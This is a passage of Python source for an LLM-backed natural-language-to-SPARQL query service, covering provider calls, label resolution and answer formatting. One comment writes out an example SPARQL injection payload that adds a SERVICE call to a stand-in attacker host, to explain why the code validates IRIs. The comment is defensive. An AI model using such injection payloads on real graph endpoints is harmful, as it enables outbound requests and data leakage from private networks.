                    or "meta-llama/llama-3.1-8b-instruct",
                    "provider": "openrouter",
                }
            rephrase_ms = round((time.time() - t_rephrase) * 1000, 1)
            logger.info("narrative_rephrase_ok", rephrase_ms=rephrase_ms, rows=len(bindings))
            return narrative
        except Exception:
            logger.warning("narrative_rephrase_failed", exc_info=True)
            self._last_rephrase_usage = None
            return ""

    async def _generate_sparql(
        self,
        question: str,
        ontology: str,
        graph_uri: str = "",
        error_feedback: str = "",
        examples_text: str = "",
        max_completion_tokens: int | None = None,
        prefer_fallback: bool = False,
    ) -> dict:
        # Name the target KG in the prompt (ONTA-417) so "[no instances]" reads as
        # "declared tenant-wide, absent from THIS graph" rather than "declared
        # here but empty". parse_kg_graph_uri returns None for a non-KG graph
        # (bare tenant/ontology graph), which leaves the prompt byte-identical.
        parsed_kg = parse_kg_graph_uri(graph_uri)
        prompt = build_generation_prompt(
            question,
            ontology,
            graph_uri,
            examples_text=examples_text,
            kg_name=parsed_kg[1] if parsed_kg else "",
        )
        if error_feedback:
            prompt += f"\n\n{error_feedback}"

        # Reasoning-budget recovery (persona-eval RCA), retry path only. When the
        # Cerebras reasoning model exhausted its output budget on reasoning
        # (finish_reason="length"), `ask()` sets `prefer_fallback` to escalate OFF
        # the reasoning model to the non-reasoning OpenRouter/Anthropic JSON path,
        # which doesn't burn the budget reasoning before answering. Prefer
        # OpenRouter unless that's already the (truncating) provider, else Anthropic.
        if prefer_fallback:
            if self._openrouter_key and self._query_provider != "openrouter":
                return await self._generate_via_openrouter(prompt)
            return await self._generate_via_anthropic(prompt)

        if self._query_provider == "cerebras" and self._cerebras_key:
            # `max_completion_tokens` is threaded ONLY on the recovery retry (a
            # bigger budget so reasoning + the answer both fit). On the happy path
            # it is None and the call is byte-identical to before (default 2048).
            if max_completion_tokens is not None:
                return await self._generate_via_cerebras(prompt, max_completion_tokens=max_completion_tokens)
            return await self._generate_via_cerebras(prompt)
        if self._query_provider == "openrouter" and self._openrouter_key:
            return await self._generate_via_openrouter(prompt)
        if self._openrouter_key:
            return await self._generate_via_openrouter(prompt)
        return await self._generate_via_anthropic(prompt)

    async def _generate_via_cerebras(self, prompt: str, max_completion_tokens: int = 2048) -> dict:
        """Generate SPARQL via Cerebras with structured output.

        `max_completion_tokens` defaults to 2048 — the happy-path value, kept as a
        literal so a normal call is byte-identical to before. `ask()` passes a
        BIGGER budget only on the reasoning-budget recovery retry (see
        `CEREBRAS_LENGTH_RECOVERY_TOKENS`) after a finish_reason="length" truncation.
        """
        cerebras_url = "https://api.cerebras.ai/v1/chat/completions"
        assert_online_url(cerebras_url, purpose="query SPARQL LLM (cerebras)")
        async with httpx.AsyncClient(timeout=30) as client:
            res = await client.post(
                cerebras_url,
                headers={
                    "Authorization": f"Bearer {self._cerebras_key}",
                    "Content-Type": "application/json",
                },
                json={
                    "model": self._query_model,
                    "messages": [
                        {"role": "system", "content": SPARQL_GENERATION_SYSTEM},
                        {"role": "user", "content": prompt},
                    ],
                    # gpt-oss-120b is a reasoning model that spends output
                    # tokens on reasoning BEFORE emitting the answer. At 512 the
                    # JSON gets truncated mid-string and json.loads raises
                    # (empirically 0/3 at 512, 3/3 at 2048). Keep enough headroom
                    # for reasoning + a full SPARQL response. (OpenRouter/Anthropic
                    # caps are separate and unchanged.) The default is 2048; the
                    # reasoning-budget recovery retry passes a bigger value when a
                    # hard question still exhausts it (finish_reason="length").
                    "max_completion_tokens": max_completion_tokens,
                    "temperature": 0,
                    "response_format": {
                        "type": "json_schema",
                        "json_schema": {
                            "name": "sparql_response",
                            "strict": True,
                            "schema": {
                                "type": "object",
                                "properties": {
                                    "sparql": {"type": "string"},
                                    "explanation": {"type": "string"},
                                    "functions_needed": {
                                        "type": "array",
                                        "items": {"type": "string"},
                                    },
                                },
                                "required": ["sparql", "explanation", "functions_needed"],
                                "additionalProperties": False,
                            },
                        },
                    },
                },
            )
            res.raise_for_status()
            data = res.json()
            # `_require_message_content` raises the typed, provider-named
            # EmptyLLMResponse (a ValueError) on a null/empty/ABSENT content —
            # including the finish_reason="length" reasoning-budget truncation where
            # the `content` key is missing entirely (which used to surface as a hard
            # KeyError('content') past the retry loop). It carries the finish_reason
            # so `ask()` can RECOVER a length truncation (bigger budget / fallback).
            # Separately, the JSON DECODE is tolerant: gpt-oss-120b sometimes wraps
            # its JSON in code fences or truncates it mid-string, which used to throw
            # an uncaught JSONDecodeError past the retry loop. Now a truncated-but-
            # usable query is salvaged, and an unrecoverable blob degrades to an
            # empty `sparql` that triggers the ask() escalation path.
            result = _parse_sparql_gen_json(_require_message_content(data, "cerebras"))
            return attach_usage(
                result,
                usage=data.get("usage") if isinstance(data, dict) else None,
                model=self._query_model,
                provider="cerebras",
                response_model=(data.get("model") if isinstance(data, dict) else None) or "",
            )

    async def _generate_via_openrouter(self, prompt: str) -> dict:
        """Generate SPARQL via OpenRouter (OpenAI-compatible API)."""
        openrouter_url = f"{OPENROUTER_BASE}/chat/completions"
        assert_online_url(openrouter_url, purpose="query SPARQL LLM")
        async with httpx.AsyncClient(timeout=30) as client:
            res = await client.post(
                openrouter_url,
                headers={
                    "Authorization": f"Bearer {self._openrouter_key}",
                    "Content-Type": "application/json",
                },
                json={
                    "model": self._query_model,
                    "models": model_chain(self._query_model),
                    "messages": [
                        {"role": "system", "content": SPARQL_GENERATION_SYSTEM},
                        {"role": "user", "content": prompt},
                    ],
                    "max_tokens": 1024,
                    "response_format": {
                        "type": "json_schema",
                        "json_schema": {
                            "name": "sparql_response",
                            "strict": True,
                            "schema": {
                                "type": "object",
                                "properties": {
                                    "sparql": {"type": "string"},
                                    "explanation": {"type": "string"},
                                    "functions_needed": {
                                        "type": "array",
                                        "items": {"type": "string"},
                                    },
                                },
                                "required": ["sparql", "explanation", "functions_needed"],
                                "additionalProperties": False,
                            },
                        },
                    },
                },
            )
            res.raise_for_status()
            data = res.json()
            text = _require_message_content(data, "openrouter")
            # Strip code fences if present
            stripped = text.strip()
            if stripped.startswith("```"):
                lines = [l for l in stripped.split("\n") if not l.strip().startswith("```")]
                stripped = "\n".join(lines)
            result = json.loads(stripped)
            return attach_usage(
                result,
                usage=data.get("usage") if isinstance(data, dict) else None,
                model=self._query_model,
                provider="openrouter",
                response_model=(data.get("model") if isinstance(data, dict) else None) or "",
            )

    async def _generate_via_anthropic(self, prompt: str) -> dict:
        """Fallback: generate SPARQL via Anthropic API."""
        from infona_client.offline import assert_online_host
        assert_online_host("api.anthropic.com", purpose="Anthropic SPARQL generation")
        message = await self.anthropic.messages.create(
            model="claude-sonnet-4-6",
            max_tokens=1024,
            system=SPARQL_GENERATION_SYSTEM,
            messages=[{"role": "user", "content": prompt}],
            output_config={
                "format": {
                    "type": "json_schema",
                    "schema": {
                        "type": "object",
                        "properties": {
                            "sparql": {"type": "string", "description": "The SPARQL SELECT query"},
                            "explanation": {"type": "string", "description": "Brief explanation of what the query does"},
                            "functions_needed": {
                                "type": "array",
                                "items": {"type": "string"},
                                "description": "List of function names if computation is needed",
                            },
                        },
                        "required": ["sparql", "explanation", "functions_needed"],
                        "additionalProperties": False,
                    },
                },
            },
        )
        result = json.loads(message.content[0].text)
        msg_usage = getattr(message, "usage", None)
        usage_dict = None
        if msg_usage is not None:
            usage_dict = {
                "input_tokens": getattr(msg_usage, "input_tokens", None),
                "output_tokens": getattr(msg_usage, "output_tokens", None),
            }
        return attach_usage(
            result,
            usage=usage_dict,
            model="claude-sonnet-4-6",
            provider="anthropic",
        )

    @staticmethod
    def _humanize_uri(uri: str) -> str:
        """Extract a human-readable name from an Infona URI.

        Examples:
            https://graph.infona.ai/entities/Movie/12345 → 12345
            https://graph.infona.ai/types/Movie → Movie
            https://graph.infona.ai/entities/ConsumerComplaint/1431838 → 1431838
        """
        from urllib.parse import unquote
        path = unquote(uri.replace(f"{IRI_BASE}/", ""))
        return path.split("/")[-1]

    async def _resolve_uri_labels(
        self, bindings: list[dict], data_graph: str | None = None
    ) -> dict[str, str]:
        """Batch-resolve rdfs:label for all Infona entity/type URIs in bindings.

        Returns a mapping from URI → human-readable label.
        Falls back to extracting the last URI path segment if no label is found.

        ONTA-424: ``data_graph`` scopes the lookup. This query named no graph,
        and on Neptune that means the union of every named graph on the
        instance. It is not generated SPARQL, but it is the same leak: entity
        IRIs are minted from the TYPE and the value
        (``entities/<Type>/<safe_id>``, see ``graph/ontology_queries.py``) with
        no tenant segment, so two workspaces holding the same real-world thing
        mint the SAME IRI. An unscoped ``VALUES ?uri { … } ?uri rdfs:label
        ?label`` therefore returns whatever label ANOTHER workspace attached to
        that IRI, and the answer renders it as ours.
        """
        # Collect all unique URIs that look like Infona entities or types.
        #
        # The prefix test alone is NOT enough to interpolate a value into
        # `<{u}>`. `parse_sparql_results` flattens every binding to its `.value`
        # string, so a LITERAL is indistinguishable from an IRI here — and a
        # literal is arbitrary text the workspacef's own ingest put in the graph.
        # A value that merely STARTS with the entities prefix and then carries
        # `>` closes the IRI early, and the rest of it becomes query syntax:
        #
        #     https://graph.infona.ai/entities/X> } SERVICE <http://attacker/> { … } }#
        #
        # parses cleanly and gives the attacker an outbound SERVICE call from
        # inside the VPC. That is the same channel rule C rejects on the raw
        # route. `_is_interpolatable_iri` applies the SPARQL IRIREF grammar's own
        # exclusion set, so nothing that could terminate or escape the IRI is
        # ever interpolated. Dropping a value only costs it a label (the
        # `_humanize_uri` fallback below still names it).
        uris: set[str] = set()
        for row in bindings:
            for v in row.values():
                if not isinstance(v, str):
                    continue
                if not (
                    v.startswith(ENTITY_URI_PREFIX)
                    or v.startswith(TYPE_URI_PREFIX)
                ):
                    continue
                if not _is_interpolatable_iri(v):
                    logger.warning(
                        "label_lookup_skipped_unsafe_value", value_prefix=v[:60]
                    )
                    continue
                uris.add(v)

        if not uris:
            return {}

        resolved: dict[str, str] = {}

        # Batch SPARQL query to fetch rdfs:label for all URIs at once
        values_clause = " ".join(f"<{u}>" for u in uris)
        scope = f"FROM <{data_graph}> " if data_graph else ""
        label_query = (
            f"SELECT ?uri ?label {scope}WHERE {{ "
            f"VALUES ?uri {{ {values_clause} }} "
            f"?uri <http://www.w3.org/2000/01/rdf-schema#label> ?label . "
            f"}}"
        )
        try:
            raw = await self.neptune.query(label_query)
            _, label_bindings = parse_sparql_results(raw)
            for row in label_bindings:
                uri = row.get("uri", "")
                label = row.get("label", "")
                if uri and label:
                    resolved[uri] = label
        except Exception:
            logger.debug("uri_label_resolution_failed", uri_count=len(uris), exc_info=True)

        # Fall back to path extraction for any URIs that weren't resolved
        for uri in uris:
            if uri not in resolved:
                resolved[uri] = self._humanize_uri(uri)

        return resolved

    async def _format_answer(
        self,
        bindings: list[dict],
        explanation: str,
        missing_vars: list[str] | None = None,
        data_graph: str | None = None,
    ) -> str:
        # `missing_vars` are projected columns that bound in zero rows — reported
        # honestly (see `unbound_projection_vars`) so the caller can tell "column
        # absent" from "column empty" rather than the value silently vanishing.
        def _missing_note() -> str:
            if not missing_vars:
                return ""
            cols = ", ".join(missing_vars)
            return (
                f"\n\nNote: requested {'column' if len(missing_vars) == 1 else 'columns'} "
                f"[{cols}] not present on any matching entity — the attribute may be "
                f"unpopulated or named differently."
            )

        if not bindings:
            # Even with no rows, surface which requested columns are absent so a
            # follow-up can re-resolve rather than assume "no data at all".
            return "No results found." + _missing_note()

        # Hygiene: drop rows describing internal/housekeeping predicates
        # (`er/blockKey`, `er/erSignal_*`, `onto/batch_id`, `onto/norm/*`, …) so a
        # "describe this entity" / "list all predicates" query never leaks ER /
        # ingest plumbing as business data. Real relationships on `…/onto/<leaf>`
        # are preserved. This mirrors the Explorer panel filter via the SAME
        # shared `is_internal_predicate` helper.
        bindings = _drop_internal_predicate_rows(bindings)
        if not bindings:
            # Every row was internal plumbing — there is no user-facing data to
            # show. Report empty rather than emitting the internal predicates.
            return "No results found." + _missing_note()

        # Resolve any entity/type URIs to human-readable labels
        uri_labels = await self._resolve_uri_labels(bindings, data_graph)

        def _display(value: str) -> str:
            """Return the display form of a binding value, resolving URIs."""
            return uri_labels.get(value, value)

        if len(bindings) == 1 and len(bindings[0]) == 1 and not missing_vars:
            value = list(bindings[0].values())[0]
            return _display(str(value))

        total = len(bindings)
        cap = ANSWER_ROW_CAP
        lines = []
        if total > cap:
            # State truncation PROMINENTLY up front, not buried after the rows.
            lines.append(f"Showing first {cap} of {total} results (truncated):")
        for row in bindings[:cap]:
            parts = [f"{k}: {_display(v)}" for k, v in row.items()]
            lines.append(", ".join(parts))
        result = "\n".join(lines)
        if total > cap:
            result += f"\n(… {total - cap} more results not shown — refine the question to narrow them.)"
        return result + _missing_note()
